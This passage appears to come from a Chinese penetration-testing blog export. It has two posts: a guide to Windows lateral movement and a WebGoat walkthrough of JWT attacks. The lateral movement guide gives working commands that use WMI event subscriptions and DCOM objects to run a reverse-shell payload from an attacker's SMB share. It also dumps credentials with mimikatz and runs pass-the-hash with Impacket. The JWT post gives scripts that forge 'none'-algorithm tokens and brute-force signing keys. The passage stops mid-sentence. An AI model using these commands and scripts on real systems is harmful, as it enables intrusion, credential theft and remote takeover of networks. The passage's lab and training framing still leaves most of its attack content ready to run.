@&#123;</span><br><span class="line">Filter $EventFilter </span><br><span class="line">Consumer = $EventConsumer</span><br><span class="line">&#125;</span><br><span class="line">$FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -class</span><br><span class="line">__FilterToConsumerBinding -Arguments $FilterConsumerBindingArgs @GlobalArgs</span><br></pre></td></tr></table></figure><p>到此，已经成功在远程主机（<strong>10.10.10.19</strong>）上部署了一个事件订阅，当远程系统轮询到<strong>svchost.exe</strong>进程产生时，将通过事件消费者执行系统命令来启动<strong>calc.exe</strong>进程。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127173914387.png" alt="image-20231127173914387" style="zoom:130%;"></li></ol><h5 id="2-Sharp-WMIEvent"><a href="#2-Sharp-WMIEvent" class="headerlink" title="2.Sharp-WMIEvent"></a>2.Sharp-WMIEvent</h5><p>完整的利用过程可以整合为<strong>PowerShell</strong>脚本（<strong>Sharp-WMIEvent</strong>，见Github的相关网页），下面简单演示使用方法。</p><ol><li><p>在一台测试人员可控的服务器上搭建<strong>SMB</strong>共享服务器，并将生成的攻击载荷放入共享目录</p></li><li><p>在跳板机上执行以下命令，运行<strong>Sharp-WMIEvent</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName 10.10.10.19 -Domain hack-my.com -Username Administrator -Password Admin@123 -Command &quot;cmd.exe /c \\10.10.10.147\evilsmb\reverse_tcp.exe&quot;</span><br></pre></td></tr></table></figure><p>这将在远程主机上部署一个随机命名的永久事件订阅，并每隔60秒执行一次<strong>SMB</strong>共享中的攻击载荷，使远程主机上线。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127203758369.png" alt="image-20231127203758369" style="zoom:120%;"></li></ol><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127203823306.png" alt="image-20231127203823306" style="zoom:120%;"><h2 id="DCOM的利用"><a href="#DCOM的利用" class="headerlink" title="DCOM的利用"></a>DCOM的利用</h2><h3 id="COM和DCOM"><a href="#COM和DCOM" class="headerlink" title="COM和DCOM"></a>COM和DCOM</h3><h5 id="1-com"><a href="#1-com" class="headerlink" title="1.com"></a>1.com</h5><p><strong>COM</strong>（<strong>Component Object Model</strong>，组件对象模型）是微软的一套软件组件的二进制接口标准，使得跨编程语言的进程间通信、动态对象创建成为可能。<strong>COM</strong>是多项微软技术与框架的基础，包括<strong>OLE</strong>、<strong>OLE</strong>自动化、<strong>ActiveX</strong>、<strong>COM</strong>+、<strong>DCOM</strong>、<strong>Windows Shell</strong>, <strong>DirectX</strong>、<strong>Windows Runtime</strong>。</p><p><strong>COM</strong>由一组构造规范和组件对象库组成。<strong>COM</strong>组件对象通过接口来描述自身，组件提供的所有服务都通过其接口公开。接口被定义为“在对象上实现的一组语义上相关的功能”，实质是一组函数指针表。每个指针必须初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。<strong>COM</strong>指定了一个对象模型和编程要求，使<strong>COM</strong>对象能够与其他对象交互。这些对象可以在单个进程中，也可以在其他进程中，甚至可以在远程计算机上。<br>在<strong>Windows</strong>中，每个<strong>COM</strong>对象都由唯一的<strong>128</strong>位的二进制标识符标识，即<strong>GUID</strong>。<br>当<strong>GUID</strong>用于标识<strong>COM</strong>对象时，被称为<strong>CLSID</strong>（类标识符），当它用于标识接口时，被称为<strong>IID</strong>（接口标识符）。一些<strong>CLSID</strong>还具有<strong>ProgID</strong>，方便人们记忆。</p><h5 id="2-DCOM"><a href="#2-DCOM" class="headerlink" title="2.DCOM"></a>2.DCOM</h5><p><strong>DCOM</strong>（<strong>Distributed Component Object Model</strong>，分布式组件对象模型）是微软基于组件对象模型（<strong>COM</strong>）的一系列概念和程序接口，支持不同机器上的组件间的通信。利用<strong>DCOM</strong>，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象。<br><strong>DCOM</strong>是<strong>COM</strong>的扩展，允许应用程序实例化和访问远程计算机上的<strong>COM</strong>对象的属性和方法。<strong>DCOM</strong>使用远程过程调用（<strong>RPC</strong>）技术将组件对象模型（<strong>COM</strong>）的功能扩展到本地计算机之外，因此，在远程系统上托管<strong>COM</strong>服务器端的软件（通常在<strong>DLL</strong>或<strong>EXE</strong>中）可以通过<strong>RPC</strong>向客户端公开其方法</p><h3 id="通过DCOM横向移动"><a href="#通过DCOM横向移动" class="headerlink" title="通过DCOM横向移动"></a>通过DCOM横向移动</h3><p>部分<strong>DCOM</strong>组件公开的接口中可能包含不安全的方法。例如，<strong>MMC20.Application</strong>提供的<strong>ExecuteShellCommand</strong>方法可以在单独的进程中运行指定的程序或命令。<br>执行以下命令，可以列出计算机上所有的<strong>DCOM</strong>程序组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></table></figure><p>测试人员可以枚举包含不安全方法的其他<strong>DCOM</strong>对象，并与远程计算机的<strong>DCOM</strong>进行交互，从而实现远程执行。注意需要具备以下条件：拥有管理员权限的<strong>PowerShell</strong>，远程主机未开启防火墙。<br>目前经常利用的<strong>DCOM</strong>组件有<strong>MMC20.Application</strong>、<strong>ShellWindows</strong>、<strong>Excel.Application</strong>、 <strong>ShellBrowserWindow</strong>等，下面简要介绍。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127211121076.png" alt="image-20231127211121076" style="zoom:80%;"><h5 id="1-MMC20-Application"><a href="#1-MMC20-Application" class="headerlink" title="1.MMC20.Application"></a>1.MMC20.Application</h5><p><strong>MMC20.Application</strong>对象的<strong>Document.ActiveView</strong>下存在一个<strong>ExecuteShellCommand</strong>方法，可以用来启动子进程并运行执行的程序或系统命令</p><p>下面以<strong>MMC20.Application</strong>组件为例，在远程主机上执行攻击载荷，并上线<strong>Meterpreter</strong>。</p><ol><li><p>在一台可控的服务器上搭建SMB匿名共享服务，并将生成的攻击载荷放入共享目录，相关操作请参考前文。</p></li><li><p>在管理员权限的<strong>PowerShell</strong>中执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 通过ProgID与DCOM进行远程交互，并创建MMC20.Application对象的实例</span><br><span class="line">$com</span><br><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;10.10.10.19&quot;)</span><br><span class="line"># 调用ExecuteShellCommand方法启动进程，以运行攻击载荷</span><br><span class="line">$com.Document.Activeview.ExecuteshellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c \\192.168.2.143\evilsmb\ reverse_tcp.exe&quot;, &quot;Minimized&quot;)</span><br></pre></td></tr></table></figure><p>通过<strong>MMC20.Application</strong>在远程主机（<strong>10.10.10.19</strong>）上启动进程，加载<strong>SMB</strong>共享中的攻击载荷并执行。图5-7-3表示远程主机成功上线。<br>在调用过程中，<strong>MMC20.Application</strong>会启动<strong>mmc.exe</strong>进程，通过<strong>ExecuteShellCommand</strong>方法在<strong>mmc.exe</strong>中创建子进程，如图5-7-4所示，适用于<strong>Windows7</strong>及以上版本的系统。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214507684.png" alt="image-20231127214507684" style="zoom:130%;"><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214536758.png" alt="image-20231127214536758" style="zoom:130%;"></li></ol><h5 id="2-ShellWindows"><a href="#2-ShellWindows" class="headerlink" title="2.ShellWindows"></a>2.ShellWindows</h5><p><strong>ShellWindows</strong>组件提供了<strong>Document.Application.ShellExecute</strong>方法，如图5-7-5所示，可以启动子进程来运行指定的程序或系统命令，适用于<strong>Windows7</strong>及以上版本的系统。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214710780.png" alt="image-20231127214710780" style="zoom:120%;"><p>由于<strong>ShellWindows</strong>对象没有<strong>ProgID</strong>，因此需要使用其<strong>CLSID</strong>来创建实例。通过<strong>OleViewDotNet</strong>，可以找到<strong>ShellWindows</strong>对象的<strong>CLSID</strong>为<strong>9BA05972-F6A8-11CF-A442-00A0C90A8F39</strong>，如图5-7-6所示。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214854720.png" alt="image-20231127214854720" style="zoom:130%;"><p>在管理员权限的<strong>PowerShell</strong>中执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 通过CLSID与DCOM进行远程交互，并创建ShellWindows对象的实例</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$com = [Activator]:CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;,&quot;10,10,10.19&quot;)</span><br><span class="line"># 调用ShellExecute方法启动子进程</span><br><span class="line">$com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;C：\Windows\</span><br><span class="line">System32&quot;,$null,0)</span><br></pre></td></tr></table></figure><p>即可通过<strong>ShellWindows</strong>在远程主机（<strong>10.10.10.19</strong>）上启动<strong>calc.exe</strong>。注意，<strong>ShellWindows</strong>并不会创建新进程，而是在已有<strong>explorer.exe</strong>进程中创建并执行子进程，如图5-7-7所示。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127215638847.png" alt="image-20231127215638847" style="zoom:120%;"><h5 id="3-ShellBrowserWindow"><a href="#3-ShellBrowserWindow" class="headerlink" title="3.ShellBrowserWindow"></a>3.ShellBrowserWindow</h5><p><strong>ShellBrowserWindow</strong>中也存在一个<strong>Document.Application.ShellExecute</strong>方法，与<strong>ShellWindows</strong>一样，但不会创建新进程，而是通过已有的<strong>explorer.exe</strong>来托管子进程。该方法只适用于<strong>Windows 10</strong>和<strong>Windows Server2012</strong>等版本的系统，利用方法如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 通过CLSID与DCOM进行远程交互，并创建ShellBrowserwindow对象的实例</span><br><span class="line">$com =[Activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-</span><br><span class="line">8455-00A0C91F3880&quot;,&quot;10.10.10.13&quot;)</span><br><span class="line"># 调用ShellExecute方法启动子进程</span><br><span class="line">$com.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;C:\Windows\System32&quot;,$null,0)</span><br></pre></td></tr></table></figure><h2 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用?"></a>WinRM的利用?</h2><p><strong>WinRM</strong>是通过执行<strong>WS-Management</strong>协议（用于远程软件和硬件管理的Web服务协议）来实现远程管理的，允许处于一个共同网络内的<strong>Windows</strong>计算机彼此之间互相访问和交换信息，对应的端口是<strong>5985</strong>。在一台计算机启用<strong>WinRM</strong>服务后，防火墙会自动放行其相关通信端口，另一台计算机便能通过WiRM对其进行远程管理了。<br>注意，只有在<strong>Windows Server2008</strong>以上版本的服务器中，<strong>WinRM</strong>服务才会自动启动。测试人员通过<strong>WinRM</strong>服务进行横向移动时，需要拥有远程主机的管理员凭据信息。</p><p><strong>利用条件：</strong></p><p><strong>WinRS</strong> 适用于 <strong>Win server 2008 &#x2F; Win7</strong> 及以后的系统，但是 <strong>Win server 2008 &#x2F; PC</strong> 全版本系统默认关闭。</p><p>只有在<strong>Win server 2012</strong> 之后的版本的<strong>WinRM</strong>服务才默认启动并监听了<strong>5985</strong>端口，允许远程任意主机来管理。</p><p>执行以下命令查询<strong>WinRM</strong>状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br></pre></td></tr></table></figure><h3 id="通过WinRM执行远程命令"><a href="#通过WinRM执行远程命令" class="headerlink" title="通过WinRM执行远程命令"></a>通过WinRM执行远程命令</h3><p><strong>Windows</strong>远程管理提供了以下两个命令行工具：</p><ol><li><strong>Winrs</strong>，允许远程执行命令的命令行工具，利用<strong>WS-Management</strong>协议</li><li><strong>Winrm (Winrm.cmd)<strong>，内置系统管理命令行工具，允许管理员配置本机的</strong>WinRM</strong>服务。</li></ol><p>注意，在默认情况下，无法通过<strong>WinRM</strong>连接到目标系统。在首次使用这些工具进行<strong>WinRM</strong>连接时，可能出现提示以下错误：<strong>Winrs error: WinRM</strong>客户端无法处理该请求。<br>在下列条件下，可以将默认身份验证与IP地址结合使用：</p><ol><li>传输为<strong>HTTPS</strong>或目标位于<strong>TrustedHosts</strong>列表中，并且提供了显式凭据</li><li>使用<strong>Winrm.cmd</strong>配置<strong>TrustedHosts</strong>。注意，<strong>TrustedHosts</strong>列表中的计算机可能未经过身份验证。有关如何设置<strong>TrustedHosts</strong>的详细信息，可以通过运行<code>winrm help config</code>命令来了解。</li></ol><p>执行以下命令，手动将目标的IP地址添加到客户端的信任列表（<strong>TrustedHosts</strong>）中如图5-8-1所示。也可以将<strong>TrustedHosts</strong>设置为<code>*</code>，从而信任所有主机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/client @&#123;TrustedHosts=&quot;192.168.111.137&quot;&#125;</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br><span class="line">#通过PowerShell</span><br></pre></td></tr></table></figure><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><p>哈希传递（<strong>Pass The Hash,PTH</strong>）是一种针对<strong>NTLM</strong>协议的攻击技术。在NTLM身份认证的第三步中生成<strong>Response</strong>时，客户端直接使用用户的<strong>NTLM</strong>哈希值进行计算，用户的明文密码并不参与整个认证过程。也就是说，在<strong>Windows</strong>系统中只使用用户哈希值对访问资源的用户进行身份认证。关于<strong>NTLM</strong>协议与<strong>NTLM</strong>协议的认证流程，请读者阅读后面的<strong>NTLM Relay</strong>专题。<br>因此，当测试人员获得有效的用户名和密码哈希值后，就能够使用该信息对远程主机进行身份认证，不需暴力破解获取明文密码即可获取该主机权限。该方法直接取代了窃取用户明文密码和暴力破解哈希值的需要，在内网渗透中十分经典在域环境中，用户登录计算机时一般使用域账号，并且大多数计算机在安装时可能会使用相同的本地管理员账号和密码。因此，在域环境进行哈希传递往往可以批量获取内网主机权限。</p><h3 id="1-利用mimikatz进行PTH"><a href="#1-利用mimikatz进行PTH" class="headerlink" title="1.利用mimikatz进行PTH"></a>1.利用mimikatz进行PTH</h3><p><strong>mimikatz</strong>中内设了哈希传递功能，<strong>需要本地管理员权限</strong></p><ol><li><p>将<strong>mimikatz</strong>上传到跳板机并执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure><p>抓取用户<strong>hash</strong></p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231224115352296.png" class title="image-20231224115352296"></li><li><p>利用mimikatz,使用抓取到的NTLM哈希进行PTH攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:test.local /ntlm:161cff084477fe596a5db81874498a24&quot; exit</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231224122033021.png" class title="image-20231224122033021"></li></ol><h3 id="2-利用Impacket进行PTH"><a href="#2-利用Impacket进行PTH" class="headerlink" title="2.利用Impacket进行PTH"></a>2.利用Impacket进行PTH</h3><p><strong>Impacket</strong>项目中具有远程执行功能的几个脚本几乎都可以进行哈希传递攻击，常见的有<strong>psexec.py</strong>、<strong>smbexec.py</strong>和<strong>wmiexec.py</strong>。在使用时，可以借助内网代理等技术对内网主机进行攻击。以<strong>smbexec.py</strong>为例，执行以下命令，通过进行哈希传递，获取远程主机<br>（10.10.10.19）的交互式命令行，如图5-9-3所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hashes :570a9a65db8fba761c1008a51d4c95ab hack-my.com/ administrator@10.10.10.19</span><br><span class="line"># python smbexec.py -hashes LM Hash:NLTM Hash domain/username@ip</span><br><span class="line"># -hashes，指定用户完整的哈希值，如果LM Hash被废弃，就将其指定为O或为空</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hashes  :161cff084477fe596a5db81874498a24 test.local/Administrator@192.168.111.137</span><br><span class="line">#python smbexec.py -hashes LM HASH:NTLM HASH &lt;domain&gt;/&lt;username&gt;@&lt;IP&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">173dc846546fb0e838c0fd2ac2908c1f</span><br><span class="line">python smbexec.py -hashes :173dc846546fb0e838c0fd2ac2908c1f test.local/bob@192.168.111.136</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透体系建设 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JWT的攻击方法</title>
      <link href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
      <url>/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="JWT的攻击方法"><a href="#JWT的攻击方法" class="headerlink" title="JWT的攻击方法"></a>JWT的攻击方法</h1><h3 id="webgoat靶场搭建"><a href="#webgoat靶场搭建" class="headerlink" title="webgoat靶场搭建"></a>webgoat靶场搭建</h3><p>我用的是docker搭建，这样快一点，也可以在GitHub上下载了直接拖到kali里，但是很慢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull webgoat/webgoat-8.0    拉取docker</span><br><span class="line">docker images     查看容器是否下载成功</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230620104650145.png"><br>运行靶场</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -p 8080:8080 -t webgoat/webgoat-8.0 </span><br></pre></td></tr></table></figure><p>之后通过浏览器访问 <code>http://127.0.0.1:8080/WebGoat</code> 就可以了</p><p>在宿主机上也能访问<code>http://192.168.144.128:8080/WebGoat</code>，方便抓包</p><p>github官方连接，也可以直接下载拖到kali上<a href="https://github.com/WebGoat/WebGoat/releases">Releases · WebGoat&#x2F;WebGoat (github.com)</a></p><p><img src="http://pic.bamboo22.top/image-20230620104946666.png"></p><p><img src="http://pic.bamboo22.top/image-20230620105023348.png"></p><p>第一次进去要注册，之后登录就可以用了</p><h3 id="空加密验证攻击"><a href="#空加密验证攻击" class="headerlink" title="空加密验证攻击"></a>空加密验证攻击</h3><p><img src="http://pic.bamboo22.top/image-20230620111115257.png"></p><p>打开JWT tokens的第4部分</p><p>点击vote now 弹窗提示我们游客不能投票，需要登录</p><p>这关的要求是切换到管理员身份就能重置投票</p><p><img src="http://pic.bamboo22.top/image-20230620111411253.png"></p><p>点击切换到Tom并抓包</p><p><img src="http://pic.bamboo22.top/image-20230620121908728.png"></p><p>抓包后能看到token值 （这里记得多抓几次，有些时候看不到）</p><p><img src="http://pic.bamboo22.top/image-20230620122439982.png"></p><p>然后将这个值拿到解析网站去解析<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p><p><img src="http://pic.bamboo22.top/image-20230620122556951.png"></p><p>可以看出，这里采用了hs512算法进行加密验证，然后用户名是Tom。 那么，接下来我们尝试一下利用空加密进行绕过！！！</p><p>具体的exp代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64urlencode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).replace(<span class="string">b&#x27;+&#x27;</span>, <span class="string">b&#x27;-&#x27;</span>).replace(<span class="string">b&#x27;/&#x27;</span>, <span class="string">b&#x27;_&#x27;</span>).replace(<span class="string">b&#x27;=&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b64urlencode(<span class="string">b&#x27;&#123;&quot;alg&quot;:&quot;none&quot;&#125;&#x27;</span>)+<span class="string">b&#x27;.&#x27;</span>+b64urlencode(<span class="string">b&#x27;&#123;&quot;iat&quot;:1573470025,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Jerry&quot;&#125;&#x27;</span>)+<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行结果：</span><br><span class="line">eyJhbGciOiJub25lIn0.eyJpYXQiOjE1NzM0NzAwMjUsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230620122856301.png"></p><p>看到这里，我们将admin对应的值更改为了true ， 也就是说此时，我们设置了Jerry这个用户为admin。 然后由于还设置了alg为空密码，因此，可以绕过签名密钥未知的情况！！！ 那么，我们把之前抓到的包放出去看看：</p><p><img src="http://pic.bamboo22.top/image-20230620123037686.png"></p><p>可以看到已经重置投票了</p><p><img src="http://pic.bamboo22.top/image-20230620123359767.png"></p><h3 id="字典爆破"><a href="#字典爆破" class="headerlink" title="字典爆破"></a>字典爆破</h3><p>对 JWT 的密钥爆破需要在一定的前提下进行：</p><ul><li>知悉JWT使用的加密算法</li><li>一段有效的、已签名的token</li><li>签名用的密钥不复杂（弱密钥）</li></ul><p>进入下一关，看到题目描述是去找到秘钥，提交一个新的key，将username改为WebGoat</p><p><img src="http://pic.bamboo22.top/image-20230620154547838.png"></p><p>先把token丢到加密网站看看是什么内容</p><p><img src="http://pic.bamboo22.top/image-20230620154943362.png"></p><p>接下来我们需要爆破私钥</p><p>我使用的是JWT_tool爆破</p><p><a href="http://t.csdn.cn/y9B86">JWT攻击手册(附jwt_tool用法,爆破弱密钥等)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py JWT_HERE -C -d dictionary.txt     用dictionary.txt作为字典爆破</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230620172719645.png"></p><p>得到key的值是<code>available</code></p><p>在这里我找字典找了很久，最后在这里找到<a href="https://github.com/TheKingOfDuck/fuzzDicts">TheKingOfDuck&#x2F;fuzzDicts: Web Pentesting Fuzz (github.com)</a></p><p>也可以跑python脚本，网上找到的python脚本，但是我跑的时候一直报错，还没解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> termcolor</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = <span class="string">R&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY3MDc2NTAzOCwiZXhwIjoxNjcwNzY1MDk4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.aIR7sjd5o7XJgUkYPCw76e9iF838G-Hh9J-sN1M-J94&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;top1000.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! no key be found.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到key后修改内容</p><p><img src="http://pic.bamboo22.top/image-20230620173102617.png"></p><p>这道题还设置了时间戳，将exp中的时间即过期时间，将其设置为一个当前时间之后的数</p><p><img src="http://pic.bamboo22.top/image-20230620173338087.png"></p><p>成功</p><p><img src="http://pic.bamboo22.top/image-20230620173318200.png"></p><h3 id="认证-键值逻辑"><a href="#认证-键值逻辑" class="headerlink" title="认证-键值逻辑"></a>认证-键值逻辑</h3><p><img src="http://pic.bamboo22.top/image-20230621164429911.png"></p><p>这一关应该是一个真实案例，一个应用键值逻辑来绕过的例子</p><p><img src="http://pic.bamboo22.top/image-20230621164902180.png"></p><p>下面这个问题描述，大概意思就是你要重置密码，但是用的是无法识别的设备或地址，需要回答验证问题，但是你忘了你设置的答案</p><p>看一下源码：</p><p><img src="http://pic.bamboo22.top/8249cc0956ef4a23802d72759dd50b5f.png"></p><p>这里可以看出来，一共有两个问题并且有相应的答案。 那么试想一下，如果我们查询secQuestion2， 